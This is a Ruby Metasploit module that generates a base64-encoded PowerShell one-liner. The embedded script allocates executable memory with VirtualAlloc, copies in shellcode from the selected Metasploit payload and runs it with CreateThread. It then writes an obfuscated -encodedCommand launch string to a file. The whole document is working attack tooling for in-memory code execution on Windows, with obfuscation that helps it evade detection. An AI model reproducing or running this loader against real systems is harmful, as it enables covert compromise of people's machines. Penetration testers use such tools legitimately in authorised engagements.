require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking
	include Msf::Auxiliary::Report

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Encoded PowerShell Payload Generator',
			'Description'    => %q{This module will generate a text file that contains a
								base64 encoded PowerShell command that will execute the
								specified Metasploit payload.},
			'Author'         =>
				[
					'Scott Sutherland "nullbind" <scott.sutherland [at] netspi.com>',
				],
			'Platform'      => [ 'win' ],
			'License'        => MSF_LICENSE,
			'References'     => [['URL','http://www.exploit-monday.com/2011_10_16_archive.html']],
			'Platform'       => 'win',
			'DisclosureDate' => 'Oct 10 2011',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0
		))

		register_options(
			[
				OptString.new('TARGET_ARCH',  [true, '64,32', '64']),
				OptString.new('OUT_DIR',  [true, 'output directory', '/']),
			], self.class)
	end

	def exploit

		# Display status to users
		print_status("Generating encoded PowerShell payload...")

		# Generate powershell command
		ps_cmd = gen_ps_cmd

		# Define pseudo unique value for file name
		rand_val = rand_text_alpha(8)
		
		# Define file path
		thefilepath = datastore['OUT_DIR'] + "pscmd_" + rand_val + ".txt"
		
		# Output file to specified location
		File.open(thefilepath, 'wb') { |file| file.write(ps_cmd)}

		# Get file size
		output_file_size = File.size(thefilepath)

		# Display status to users
		print_good("#{output_file_size} bytes where written to #{thefilepath}")
		print_status("Module execution complete\n")

	end

	# ------------------------------
	# Generate powershell payload
	# ------------------------------
	def gen_ps_cmd()
		# Create powershell script that will inject shell code from the selected payload
		myscript ="$code = @\"
[DllImport(\"kernel32.dll\")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport(\"kernel32.dll\")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport(\"msvcrt.dll\")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);
\"@
$winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru
[Byte[]]$sc =#{Rex::Text.to_hex(payload.encoded).gsub('\\',',0').sub(',','')}
$size = 0x1000
if ($sc.Length -gt 0x1000) {$size = $sc.Length}
$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40)
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)}
$winFunc::CreateThread(0,0,$x,0,0,0)"

		# Unicode encode the powershell script
		mytext_uni = Rex::Text.to_unicode(myscript)

		# Base64 encode the unicode encoded script
		mytext_64 = Rex::Text.encode_base64(mytext_uni)

		# Setup path for powershell based on architecture
		if datastore['TARGET_ARCH'] == "32" then
			mypath = ""
		else
			mypath="C:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\"
		end

		# Create powershell command to be executed
		ps_cmd = "#{mypath}powershell.exe -noexit -noprofile -encodedCommand #{mytext_64}"

		return ps_cmd
	end

end
